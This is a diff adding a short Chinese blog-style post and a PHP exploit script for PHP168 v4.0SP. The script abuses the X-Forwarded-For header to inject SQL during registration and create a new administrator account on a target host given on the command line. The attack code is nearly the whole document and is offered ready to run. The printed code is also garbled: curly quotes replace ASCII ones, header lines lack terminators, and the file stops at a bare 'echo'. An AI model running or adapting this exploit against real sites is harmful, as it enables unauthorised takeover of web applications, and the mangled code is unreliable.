@@ -1,0 +1,53 @@
+PHP168 X-Forwarded-For的漏洞利用
+
+PHP168 X-Forwarded-For的漏洞利用  
+漏洞本身的成因没什么好说的，老掉牙的x-forwarded-for的问题，我想这个漏洞很多人都找到了。 
+因为这个漏洞也有些时间了，当时只是在pc上测试了一下，可能有些错误，有兴趣的同学可以自己研究一下。 
+
+<?php 
+print_r(” 
++——————————————————————+ 
+Create New Admin Exploit For php168 v4.0SP\n 
+amxku.net 
++——————————————————————+ 
+
+“); 
+if ($argc<4) { 
+echo “Usage: php “.$argv[0].” host path uid\n”; 
+echo “host: target server \n”; 
+echo “path: path to php168\n”; 
+echo “uid: the user uid\n”; 
+echo “Example:”; 
+echo “php “.$argv[0].” www.php168.com / 123345\n”; 
+die; 
+} 
+$host=$argv[1]; 
+$path=$argv[2]; 
+$id=$argv[3]+2; 
+$cmd = “xxxx’,''0′,’111′,’0′,’1′,”, ”, ‘123′, ‘123′, ‘123′, ‘123′, ‘0′, ”, ‘0′, ”, ”, ”, ”),(’”.$id.“‘, ‘0′, ‘3′, ”, ‘1′, ‘0′, ”, ‘1′, ‘1′, ‘1′, ‘1′, ‘1′, ‘1′, ‘1′, ”, ”, ‘1′, ‘1′, ‘1′, ‘1′, ‘0′, ”, ‘0′, ”, ”, ”, ”)/*”; 
+$content_1= “username=amxku&email=amxku@msn.com&password=longze&password2=longze&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2″; 
+$content_2= “username=amxku&email=amxku@msn.com&password=longze&password2=longze&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2″; 
+senddate($content_1); 
+senddate($content_2); 
+function senddate($content){ 
+global $path,$host,$cmd; 
+$data = “POST “.$path.“reg.php”.” HTTP/1.1″; 
+$data .= “Accept: */*”; 
+$data .= “Accept-Language: zh-cn”; 
+$data .= “Content-Type: application/x-www-form-urlencoded”; 
+$data .= “User-Agent: Mozilla/4.0″; 
+$data .= “Host: “.$host.“”; 
+$data .= “x-forwarded-for: “.$cmd.“”; 
+$data .= “Content-length: “.strlen($content).“”; 
+$data .= “Connection: Keep-Alive”; 
+$data .= “”; 
+$data .= $content.“”; 
+$sendto=fsockopen($host,80); 
+if (!$sendto) { 
+echo ‘No response from ‘.$host; 
+die; 
+} 
+fputs($sendto,$data); 
+fclose($sendto); 
+}; 
+echo  
